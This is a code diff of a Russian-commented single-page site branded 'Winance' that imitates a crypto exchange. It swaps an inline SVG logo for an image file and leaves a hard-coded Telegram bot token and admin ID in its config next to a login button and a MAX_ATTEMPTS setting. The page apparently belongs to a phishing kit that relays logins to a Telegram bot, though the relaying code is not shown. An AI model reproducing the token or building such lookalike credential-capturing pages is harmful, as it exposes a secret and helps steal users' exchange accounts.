@@ -74,17 +74,10 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     border-bottom: 1px solid var(--border);
 }
 
-/* Блок с логотипом */
 .appbar-brand {
     display: flex;
     align-items: center;
     gap: 10px;
-}
-/* Оригинальный логотип Winance (черный, с короной) */
-.logo-svg {
-    height: 24px;
-    width: auto;
-    display: block;
 }
 
 /* Кнопка Войти наверху */
@@ -367,23 +360,18 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
 <div class="app">
 
-    <!-- ============ ВЕРХНЯЯ ПАНЕЛЬ (ЛОГО + КНОПКА) ============ -->
+    <!-- ============ ВЕРХНЯЯ ПАНЕЛЬ ============ -->
     <div class="appbar">
         <div class="appbar-brand">
-            <!-- Оригинальный логотип Winance -->
-            <svg class="logo-svg" viewBox="0 0 140 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M25.5 7L20.5 10.5L15.5 5L10.5 10.5L5.5 7L7.5 14L3 21H18L23 14H27L25.5 7ZM15.5 18H10L13 11L15.5 18Z" fill="#0A0B0D"/>
-                <text x="35" y="22" font-family="Inter, sans-serif" font-size="22" font-weight="800" fill="#0A0B0D" letter-spacing="-0.5">Winance</text>
-            </svg>
+            <!-- СЮДА ВСТАВЬ КАРТИНКУ ЛОГОТИПА -->
+            <img src="logo.png" alt="Winance" style="height: 32px; width: auto; display: block;">
         </div>
-        <!-- Кнопка Войти -->
         <button class="btn-login-top" onclick="goTo('loginForm')">Войти</button>
     </div>
 
     <!-- ============ ГЛАВНАЯ ============ -->
     <div id="pageMain" class="page active">
         
-        <!-- ГРАФИК BTC/USDT -->
         <div class="chart-container">
             <div class="chart-header">
                 <div>
@@ -533,7 +521,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     // КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН)
     // ============================================================
-    const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
+   const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
     const ADMIN_ID  = "8949174431";
     const SUPPORT_LINK = "https://t.me/winance_support"; // Ссылка на ТП
     const MAX_ATTEMPTS = 3;
